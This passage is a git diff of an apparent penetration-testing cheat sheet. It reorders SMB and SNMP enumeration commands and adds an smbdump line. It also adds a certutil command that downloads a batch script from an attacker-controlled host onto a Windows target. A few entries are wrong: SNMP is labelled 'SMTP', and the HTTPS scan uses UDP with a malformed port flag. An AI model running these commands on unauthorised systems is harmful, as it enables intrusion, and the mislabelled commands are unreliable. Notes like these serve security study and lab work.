@@ -119,21 +119,12 @@ ssh -i ssh.key -6 user@[IPv6]`
 - SQLMAP
 - OWASP ZAP
 
-### SMTP (161 UDP)
-
-`nmap -sU --open -p161 --script=snmp* <[HOST IP]>`
-
-`onesixtyone -c public <[HOST IP]>` -->Check string "public"
-
-`snmpwalk -c public -v[1,2c,3] [HOST IP]` -->Extract info from string "public"
-
-### HTTPS (443)
-
-`nmap -sU --open -443 --script=ssl* <[HOST IP]>`
-
-### SMB (445)
+### SMB (139/445)
 
 ```nmap -p 445 -vv --script="smb-vuln-*,smb-enum-*" <[HOST IP]>
+
+SMBDUMP
+smbdump <HOST IP>
 
 ENUM4LINUX
 enum4linux -a <[HOST IP]>
@@ -154,6 +145,18 @@ MOUNT SHARE
 mount -t cifs -o user=USERNAME,sec=ntlm,dir_mode=0077 "//<[HOST IP]>/My Share" /mnt/cifs
 mount -t cifs -o "//<[HOST IP]>/IPC" /mnt/cifs
 ```
+
+### SMTP (161 UDP)
+
+`nmap -sU --open -p161 --script=snmp* <[HOST IP]>`
+
+`onesixtyone -c public <[HOST IP]>` -->Check string "public"
+
+`snmpwalk -c public -v[1,2c,3] [HOST IP]` -->Extract info from string "public"
+
+### HTTPS (443)
+
+`nmap -sU --open -443 --script=ssl* <[HOST IP]>`
 
 ## 5) EXPLOIT (USER 1)
 
@@ -245,6 +248,9 @@ nc [destination] 1234 < out.file
 `FILE: #!/usr/bin/php <?php $data = @file("http://example.com/file"); $lf = "local_file"; $fh = fopen($lf, 'w'); fwrite($fh, $data[0]); fclose($fh); ?>`
 
 `php file.php`
+
+#### CERTUTIL
+`certutil.exe -urlcache -split -f "http://$IP/Powerless.bat" Powerless.bat`
 
 ### REVERSE SHELL
 
